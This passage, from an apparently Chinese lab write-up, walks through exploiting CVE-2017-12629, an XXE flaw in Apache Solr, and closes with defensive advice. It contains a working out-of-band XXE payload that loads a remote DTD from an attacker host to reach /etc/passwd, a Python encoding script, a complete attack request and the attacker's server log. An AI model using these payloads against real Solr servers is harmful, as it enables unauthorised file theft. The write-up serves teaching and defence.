&lt;figure class=&#34;highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs xml&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?xml version=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;1.0&amp;quot;&lt;/span&gt; encoding=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;UTF-8&amp;quot;&lt;/span&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;!DOCTYPE &lt;span class=&#34;hljs-keyword&#34;&gt;root&lt;/span&gt; [&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;  &lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;!ENTITY % &lt;span class=&#34;hljs-keyword&#34;&gt;remote&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;SYSTEM&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http://192.168.56.1/test1.dtd&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;  %remote;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;  %err;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;]&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;root&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;hljs-symbol&#34;&gt;&amp;amp;errmsg;&lt;/span&gt;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;root&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;说明&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;!ENTITY % remote SYSTEM &amp;quot;http://192.168.56.1/test1.dtd&amp;quot;&amp;gt;&lt;/code&gt;：加载远程 DTD。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;%remote;&lt;/code&gt;：执行 DTD 中的定义。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;%err;&lt;/code&gt;：触发嵌套实体，尝试加载 &lt;code&gt;/etc/passwd&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;amp;errmsg;&lt;/code&gt;：引用嵌套实体，诱导 Solr 解析。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;4-URL-编码-Payload&#34;&gt;&lt;a href=&#34;#4-URL-编码-Payload&#34; class=&#34;headerlink&#34; title=&#34;4. URL 编码 Payload&#34;&gt;&lt;/a&gt;4. URL 编码 Payload&lt;/h3&gt;&lt;p&gt;由于 Payload 将通过 GET 参数 &lt;code&gt;q&lt;/code&gt; 提交，需进行 URL 编码。使用 Python 脚本生成编码后的 Payload：&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; urllib.parse&lt;br&gt;&lt;br&gt;payload = &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;lt;!DOCTYPE root [&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;  &amp;lt;!ENTITY % remote SYSTEM &amp;quot;http://192.168.56.1/test1.dtd&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;  %remote;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;  %err;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;]&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;lt;root&amp;gt;&amp;amp;errmsg;&amp;lt;/root&amp;gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;br&gt;encoded_payload = urllib.parse.quote(payload)&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(encoded_payload)&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;示例输出&lt;/strong&gt;（部分）：&lt;/p&gt;
&lt;figure class=&#34;highlight llvm&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs llvm&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%3&lt;/span&gt;C&lt;span class=&#34;hljs-variable&#34;&gt;%3&lt;/span&gt;Fxml&lt;span class=&#34;hljs-variable&#34;&gt;%20&lt;/span&gt;version&lt;span class=&#34;hljs-variable&#34;&gt;%3&lt;/span&gt;D&lt;span class=&#34;hljs-variable&#34;&gt;%221&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%22&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%20&lt;/span&gt;encoding&lt;span class=&#34;hljs-variable&#34;&gt;%3&lt;/span&gt;D&lt;span class=&#34;hljs-variable&#34;&gt;%22&lt;/span&gt;UTF&lt;span class=&#34;hljs-number&#34;&gt;-8&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%22&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%3&lt;/span&gt;F&lt;span class=&#34;hljs-variable&#34;&gt;%3&lt;/span&gt;E&lt;span class=&#34;hljs-variable&#34;&gt;%0&lt;/span&gt;A&lt;span class=&#34;hljs-variable&#34;&gt;%3&lt;/span&gt;C&lt;span class=&#34;hljs-title&#34;&gt;!DOCTYPE&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%20&lt;/span&gt;root&lt;span class=&#34;hljs-variable&#34;&gt;%20&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%5&lt;/span&gt;B&lt;span class=&#34;hljs-variable&#34;&gt;%0&lt;/span&gt;A&lt;span class=&#34;hljs-variable&#34;&gt;%20&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%20&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%3&lt;/span&gt;C&lt;span class=&#34;hljs-title&#34;&gt;!ENTITY&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%20&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%25&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%20&lt;/span&gt;remote&lt;span class=&#34;hljs-variable&#34;&gt;%20&lt;/span&gt;SYSTEM&lt;span class=&#34;hljs-variable&#34;&gt;%20&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%22&lt;/span&gt;http&lt;span class=&#34;hljs-variable&#34;&gt;%3&lt;/span&gt;A&lt;span class=&#34;hljs-variable&#34;&gt;%2&lt;/span&gt;F&lt;span class=&#34;hljs-variable&#34;&gt;%2&lt;/span&gt;F&lt;span class=&#34;hljs-number&#34;&gt;192.168&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;56.1&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%2&lt;/span&gt;Ftest&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;.dtd&lt;span class=&#34;hljs-variable&#34;&gt;%22&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%3&lt;/span&gt;E&lt;span class=&#34;hljs-variable&#34;&gt;%0&lt;/span&gt;A&lt;span class=&#34;hljs-variable&#34;&gt;%20&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%20&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%25&lt;/span&gt;remote&lt;span class=&#34;hljs-variable&#34;&gt;%3&lt;/span&gt;B&lt;span class=&#34;hljs-variable&#34;&gt;%0&lt;/span&gt;A&lt;span class=&#34;hljs-variable&#34;&gt;%20&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%20&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%25&lt;/span&gt;err&lt;span class=&#34;hljs-variable&#34;&gt;%3&lt;/span&gt;B&lt;span class=&#34;hljs-variable&#34;&gt;%0&lt;/span&gt;A&lt;span class=&#34;hljs-variable&#34;&gt;%5&lt;/span&gt;D&lt;span class=&#34;hljs-variable&#34;&gt;%3&lt;/span&gt;E&lt;span class=&#34;hljs-variable&#34;&gt;%0&lt;/span&gt;A&lt;span class=&#34;hljs-variable&#34;&gt;%3&lt;/span&gt;Croot&lt;span class=&#34;hljs-variable&#34;&gt;%3&lt;/span&gt;E&lt;span class=&#34;hljs-variable&#34;&gt;%26&lt;/span&gt;errmsg&lt;span class=&#34;hljs-variable&#34;&gt;%3&lt;/span&gt;B&lt;span class=&#34;hljs-variable&#34;&gt;%3&lt;/span&gt;C&lt;span class=&#34;hljs-variable&#34;&gt;%2&lt;/span&gt;Froot&lt;span class=&#34;hljs-variable&#34;&gt;%3&lt;/span&gt;E&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;5-构造最终攻击请求&#34;&gt;&lt;a href=&#34;#5-构造最终攻击请求&#34; class=&#34;headerlink&#34; title=&#34;5. 构造最终攻击请求&#34;&gt;&lt;/a&gt;5. 构造最终攻击请求&lt;/h3&gt;&lt;p&gt;使用 Burp Suite 的 Repeater 模块，构造以下 GET 请求：&lt;/p&gt;
&lt;figure class=&#34;highlight http&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs http&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;GET&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;/solr/demo/select?q=&amp;lt;Encoded_Payload&amp;gt;&amp;amp;wt=xml&amp;amp;defType=xmlparser&lt;/span&gt; &lt;span class=&#34;hljs-meta&#34;&gt;HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Host&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;192.168.56.102:8983&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;User-Agent&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;Mozilla/5.0 (Windows NT 10.0; Win64; x64)&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Accept&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;*/*&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Connection&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;close&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;完整示例&lt;/strong&gt;（替换 &lt;code&gt;&amp;lt;Encoded_Payload&amp;gt;&lt;/code&gt; 为实际编码结果）：&lt;/p&gt;
&lt;figure class=&#34;highlight apache&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;GET&lt;/span&gt; /solr/demo/select?q=%&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;C%&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;Fxml%&lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;version%&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;D%&lt;span class=&#34;hljs-number&#34;&gt;221&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;%&lt;span class=&#34;hljs-number&#34;&gt;22&lt;/span&gt;%&lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;encoding%&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;D%&lt;span class=&#34;hljs-number&#34;&gt;22&lt;/span&gt;UTF-&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;%&lt;span class=&#34;hljs-number&#34;&gt;22&lt;/span&gt;%&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;F%&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;E%&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;A%&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;C!DOCTYPE%&lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;root%&lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;%&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;B%&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;A%&lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;%&lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;%&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;C!ENTITY%&lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;%&lt;span class=&#34;hljs-number&#34;&gt;25&lt;/span&gt;%&lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;remote%&lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;SYSTEM%&lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;%&lt;span class=&#34;hljs-number&#34;&gt;22&lt;/span&gt;http%&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;A%&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;F%&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;F&lt;span class=&#34;hljs-number&#34;&gt;192.168.56.1&lt;/span&gt;%&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;Ftest1.dtd%&lt;span class=&#34;hljs-number&#34;&gt;22&lt;/span&gt;%&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;E%&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;A%&lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;%&lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;%&lt;span class=&#34;hljs-number&#34;&gt;25&lt;/span&gt;remote%&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;B%&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;A%&lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;%&lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;%&lt;span class=&#34;hljs-number&#34;&gt;25&lt;/span&gt;err%&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;B%&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;A%&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;D%&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;E%&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;A%&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;Croot%&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;E%&lt;span class=&#34;hljs-number&#34;&gt;26&lt;/span&gt;errmsg%&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;B%&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;C%&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;Froot%&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;E&amp;amp;wt=xml&amp;amp;defType=xmlparser HTTP/&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Host&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;192.168.56.102:8983&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;User&lt;/span&gt;-Agent: Mozilla/&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; (Windows NT &lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; Win64; x64)&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Accept&lt;/span&gt;: */*&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Connection&lt;/span&gt;: close&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;6-验证攻击效果&#34;&gt;&lt;a href=&#34;#6-验证攻击效果&#34; class=&#34;headerlink&#34; title=&#34;6. 验证攻击效果&#34;&gt;&lt;/a&gt;6. 验证攻击效果&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;发送请求后，观察 Kali 的 HTTP 服务日志：&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;192.168.56.102 - - [01/Aug/2025 17:52:25] &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;GET /test1.dtd HTTP/1.1&amp;quot;&lt;/span&gt; 200 -&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
如果看到 Solr（&lt;code&gt;192.168.56.102&lt;/code&gt;）访问了 &lt;code&gt;test1.dtd&lt;/code&gt;，说明 DTD 被成功加载。&lt;/li&gt;
&lt;li&gt;由于 Solr 不回显 &lt;code&gt;/etc/passwd&lt;/code&gt; 内容，攻击成功仅表现为 DTD 请求到达攻击者服务器，间接证明 XXE 触发。&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h2 id=&#34;六、原理深入分析&#34;&gt;&lt;a href=&#34;#六、原理深入分析&#34; class=&#34;headerlink&#34; title=&#34;六、原理深入分析&#34;&gt;&lt;/a&gt;六、原理深入分析&lt;/h2&gt;&lt;h3 id=&#34;1-利用链条&#34;&gt;&lt;a href=&#34;#1-利用链条&#34; class=&#34;headerlink&#34; title=&#34;1. 利用链条&#34;&gt;&lt;/a&gt;1. 利用链条&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;用户输入&lt;/strong&gt;：提交包含外部实体的 XML Payload。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Solr 解析&lt;/strong&gt;：&lt;code&gt;defType=xmlparser&lt;/code&gt; 触发 XML 解析器处理 &lt;code&gt;q&lt;/code&gt; 参数。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;加载 DTD&lt;/strong&gt;：解析器访问远程 DTD（&lt;code&gt;http://192.168.56.1/test1.dtd&lt;/code&gt;）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;引用文件&lt;/strong&gt;：DTD 中的实体尝试加载本地文件（如 &lt;code&gt;/etc/passwd&lt;/code&gt;）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;外带请求&lt;/strong&gt;：通过嵌套实体，Solr 发起对攻击者服务器的请求，携带文件内容或触发日志。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;2-关键点&#34;&gt;&lt;a href=&#34;#2-关键点&#34; class=&#34;headerlink&#34; title=&#34;2. 关键点&#34;&gt;&lt;/a&gt;2. 关键点&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;defType=xmlparser&lt;/code&gt;&lt;/strong&gt;：启用 Solr 的 XML 解析器，是触发 XXE 的核心。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;远程 DTD&lt;/strong&gt;：绕过 Solr 无回显限制，通过外带技术验证文件读取。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;嵌套实体&lt;/strong&gt;：通过 &lt;code&gt;%err&lt;/code&gt; 和 &lt;code&gt;&amp;amp;errmsg;&lt;/code&gt; 构造复杂实体链，确保文件被引用。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;3-限制与挑战&#34;&gt;&lt;a href=&#34;#3-限制与挑战&#34; class=&#34;headerlink&#34; title=&#34;3. 限制与挑战&#34;&gt;&lt;/a&gt;3. 限制与挑战&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;无回显&lt;/strong&gt;：需依赖外带技术，增加利用复杂度。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;网络限制&lt;/strong&gt;：目标服务器需允许出站 HTTP 请求，否则 DTD 无法加载。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;DTD 构造&lt;/strong&gt;：需要精确定义实体，避免解析错误。&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;七、防护建议&#34;&gt;&lt;a href=&#34;#七、防护建议&#34; class=&#34;headerlink&#34; title=&#34;七、防护建议&#34;&gt;&lt;/a&gt;七、防护建议&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;升级 Solr 版本&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;升级到 Apache Solr 7.1.0 或更高版本，官方已修复 XXE 漏洞。&lt;/li&gt;
&lt;li&gt;定期检查 Solr 更新，应用最新补丁。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;禁用 XML 解析器&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;禁用 &lt;code&gt;defType=xmlparser&lt;/code&gt;，或限制对 &lt;code&gt;/solr/demo/select&lt;/code&gt; 接口的访问。&lt;/li&gt;
&lt;li&gt;在 Solr 配置文件中关闭不必要的查询解析器。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;限制出站网络请求&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;配置防火墙，阻止 Solr 实例访问外部 HTTP 资源。&lt;/li&gt;
&lt;li&gt;使用网络策略（如 iptables）限制出站流量。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;启用 WAF&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;部署 Web 应用防火墙，检测包含 &lt;code&gt;&amp;lt;!DOCTYPE&lt;/code&gt; 或 &lt;code&gt;&amp;lt;!ENTITY&lt;/code&gt; 的 XML 请求。&lt;/li&gt;
&lt;li&gt;配置正则规则，拦截潜在 XXE Payload。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;安全编码&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;在开发中禁用 XML 外部实体解析，例如：&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs java&#34;&gt;&lt;span class=&#34;hljs-type&#34;&gt;DocumentBuilderFactory&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;dbf&lt;/span&gt; &lt;span class=&#34;hljs-operator&#34;&gt;=&lt;/span&gt; DocumentBuilderFactory.newInstance();&lt;br&gt;dbf.setFeature(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http://apache.org/xml/features/disallow-doctype-decl&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt;);&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;使用安全的 XML 解析库（如 SAX 或 DOM4J）。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;日志监控&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;定期检查 Solr 日志，关注异常的 XML 解析请求。&lt;/li&gt;
&lt;li&gt;监控出站网络流量，及时发现外带攻击。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h2 id=&#34;八、总结&#34;&gt;&lt;a href=&#34;#八、总结&#34; class=&#34;headerlink&#34; title=&#34;八、总结&#34;&gt;&lt;/a&gt;八、总结&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;项目&lt;/th&gt;
&lt;th&gt;信息&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;漏洞编号&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;CVE-2017-12629&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;漏洞类型&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;XXE（XML 外部实体注入）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
